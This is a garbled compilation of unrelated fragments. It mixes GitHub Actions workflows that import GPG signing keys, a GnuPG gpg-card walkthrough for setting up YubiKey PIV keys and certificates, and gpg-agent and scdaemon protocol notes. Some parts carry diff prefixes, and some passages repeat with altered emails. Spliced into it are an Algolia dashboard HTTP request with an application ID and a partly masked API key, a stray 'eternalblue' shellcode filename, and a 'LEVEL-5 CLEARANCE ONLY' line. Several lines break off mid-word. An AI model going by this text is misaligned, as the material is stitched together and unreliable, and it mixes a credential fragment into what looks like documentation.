+    CGO_ENABLED: 1
+- uses: cli/gh-extension-precompile@v1
+  with:
+    build_script_override: "script/build.sh"
+name: release
+
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - id: import_gpg
+        uses: crazy-max/ghaction-import-gpg@v5
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.GPG_PASSPHRASE }}
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS
+gpg --armor --export-secret-key joe@foo.bar | pbcopy
+
+# Ubuntu (assuming GNU base64)
+gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
+
+# Arch
+gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
+
+# FreeBSD (assuming BSD base64)
+gpg --armor --export-secret-key joe@foo.bar | xclip
+
+name: import-gpg
+
+on:
+  push:
+    branches: master
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+      -
+        name: List keys
+        run: gpg -K
+name: import-gpg
+
+on:
+  push:
+    branches: master
 
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
+      -
+        name: List keys
+        run: gpg -K
+
+pub   ed25519 2021-09-24 [C]
+      87F257B89CE462100BEC0FFE6071D218380FDCC8
+      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid           [ unknown] Joe Bar <joe@bar.foo>
+sub   ed25519 2021-09-24 [S]
+      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
+      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg
+/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
+
+application-priority piv
+to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
+
+With one of these methods employed the list command of gpg-card shows this:
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+list --cards
+well. The PIV authentication key (internal reference PIV.9A
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+ ‘--force’
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip
+gpg
+self-signed X.509 certificate (exit the gpg-card tool, first):
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip 
+gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+gpgsm --with-keygrip -k 6309304695z@gmail.com
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> 6309304695z@gmail.com
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: 6309304695z@gmail.com
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+‘gpgsm --learn’
+Digital signature’ key
+gpg-card:010203040506070801020304050607080102030405060708
+
+shellcode/eternalblue_sc_merge.py
+
+gpg/card> writecert PIV.9C < sign.crt
 on:
   push:
     branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key]
AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref
Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
Write a certificate to the card under the id certref. 

WRITEKEY [--force] keyref keygrip ¶
Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
—Shadowed

YUBIKEY cmd args ¶
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp
gpg/card> yubikey list
Application  USB    NFC
-----------------------
OTP          yes    yes
U2F          yes    yes
OPGP         no     no
PIV          yes    no
OATH         yes    yes
FIDO2        yes    yes
gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D 
—force

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

[...]
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

PIV authentication’ key with ssh:

$ ssh-add -l
384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn
$ gpg --full-gen-key
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 3
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name:
Email address: otto@example.net
Comment:
You selected this USER-ID:
    "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
gpg: key C3AFA9ED971BB365 marked as ultimately trusted
gpg: revocation certificate stored as '[...]D971BB365.rev'
public and secret key created and signed.

Note that this key cannot be used for encryption.  You may want to use
the command "--edit-key" to generate a subkey for this purpose.
pub   rsa2048 2019-04-04 [SC]
      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
uid                      otto@example.net
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
Secret key is available.

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
[ultimate] (1). otto@example.net
gpg> addkey
Secret parts of primary key are stored on-card.
Please select what kind of key you want:
   (3) DSA (sign only)
   (4) RSA (sign only)
   (5) Elgamal (encrypt only)
   (6) RSA (encrypt only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 4
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y
Really create? (y/N) y

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
ssb  rsa2048/7067860A98FCE6E1
     created: 2019-04-04  expires: never       usage: E
     card-no: FF020001008A77C1
[ultimate] (1). otto@example.net

gpg> save
Now you can use your PIV card also with gpg.


     # 000006
/* 32A19-D90712   
LEVEL-5 CLEARANCE ONLY
 ‘--force’
authentication key 
-header-'010203040506070801020304050607080102030405060708'
SETDATA hexstring
to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

  PKSIGN keyid
where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

  PKSIGN --hash=algoname keyid
READKEY hexified_certid
READCERT hexified_certid|keyid
SERIALNO
Return the serial number of the card using a status response like:

  S SERIALNO D27600000000000000000000
 WRITEKEY [--force] keyid
SETDATA hexstring
to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

  PKDECRYPT keyid
CHECKPIN idstr
RESTART
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va
CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
  A6935DD34EF3087973C706FC311AA2CCF733765B S

  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  
       # Key added on: 2011-07-20 20:38:46
       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/
gpg-connect-agent 'help COMMAND' /bye
SETKEY <keyGrip>
Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

  PKDECRYPT
The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

    S: INQUIRE CIPHERTEXT
    C: D (xxxxxx
    C: D xxxx)
    C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

     (enc-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

   C: PKDECRYPT
   S: INQUIRE CIPHERTEXT
   C: D (enc-val elg (a 349324324)
   C: D    (b 3F444677CA)))
   C: END
   S: # session key follows
   S: S PADDING 0
   S: D (value 1234567890ABCDEF0)
   S: OK decryption successful
The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
SIGKEY <keyGrip>
This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

   SETHASH --hash=<name>|<algo> <hexstring>
sig-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
The operation is affected by the option

   OPTION use-cache-for-signing=0|1
The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

   C: SIGKEY <keyGrip>
   S: OK key available
   C: SIGKEY <keyGrip>
   S: OK key available
   C: PKSIGN
   S: # I did ask the user whether he really wants to sign
   S: # I did ask the user for the passphrase
   S: INQUIRE HASHVAL
   C: D ABCDEF012345678901234
   C: END
   S: # signature follows
   S: D (sig-val rsa (s 45435453654612121212))
   S: OK
  GENKEY [--no-protection] [--preset] [<cache_nonce>]
Invokes the key generation process and the server will then inquire on the generation parameters, like:

   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
The format of the key parameters which depends on the algorithm is of the form:

    (genkey
      (algo
        (parameter_name_1 ....)
          ....
        (parameter_name_n ....)))
If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:

     (public-key
       (rsa
 	 (n <mpi>)
 	 (e <mpi>)))
Here is an example session:

   C: GENKEY
   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
   S: D (public-key
   S: D   (rsa (n 326487324683264) (e 10001)))
   S  OK key created
    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
LISTTRUSTED
GpgAgent returns a list of trusted keys line by line:

    S: D 000000001234454556565656677878AF2F1ECCFF P
    S: D 340387563485634856435645634856438576457A P
    S: D FEDC6532453745367FD83474357495743757435D S
    S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
Ok
Finally a client should be able to mark a key as trusted:

   MARKTRUSTED fingerprint "P"|"S"
The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

   S: INQUIRE TRUSTDESC
   C: D Do you trust the key with the fingerprint @FPR@
   C: D bla fasel blurb.
   C: END
   S: OK
GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
                 [--qualitybar] cache_id                \
                 [error_message prompt description]
PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]

HAVEKEY keygrips
  GET_CONFIRMATION description
  LEARN [--send]
UPDATESTARTUPTTY
SETDATA hexstring


  PKSIGN keyid


  PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid
READKEY hexified_certid
SETDATA hexstring
d

  PKSIGN keyid
 LEARN

  PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid
WRITEKEY [--force] keyid
PASSWD [--reset] [--nullpin] chvno
CHECKPIN idstr
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
this:

     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import 

command --locate-external-key
command --locate-external-key
github/workflows/release.yml:
ldap://keys.(thedomain)
‘--auto-key-locate
 --auto-key-locate
--auto-key-retrieve


 honor-keyserver-url 

-sig-keyserver-url
--recv-key
honor-keyserver-url
--use-agent
--gpg-agent-info


--no-random-seed-file
Host: c7-use-3.algolianet. com
Accept: */*
Sec-Fetch-Site: cross-site
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
Origin: https://dashboard.algolia.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
x-algolia-api-key: b3cf*************************米**
Content-Length: 27
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty

scdaemon.conf
1
HKCU\Software\GNU\GnuPG:DefaultLogFile,
--debug-level level
HKCU\Software\GNU\GnuPG:DefaultLogFile,
scd-event
HKCU\Software\GNU\GnuPG:HomeDir
HKCU\Software\GNU\GnuPG:DefaultLogFile,
reader_n.status
HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file
gpg-agent.conf
HKCU\Software\GNU\GnuPG:HomeDir
name: release
debug-pinentry 
--debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards
Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
gpg-connect-agent updatestartuptty /bye
Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye
--scdaemon-program filename
Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
--check-passphrase-pattern file
--check-sym-passphrase-pattern file
Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
Keys listed in the sshcontrol file
--disable-extended-key-format
These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support
--enable-win32-openssh-support
--enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye
gpg-connect-agent 'GETINFO s2k_time' /bye
To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye
--ssh-fingerprint-digest
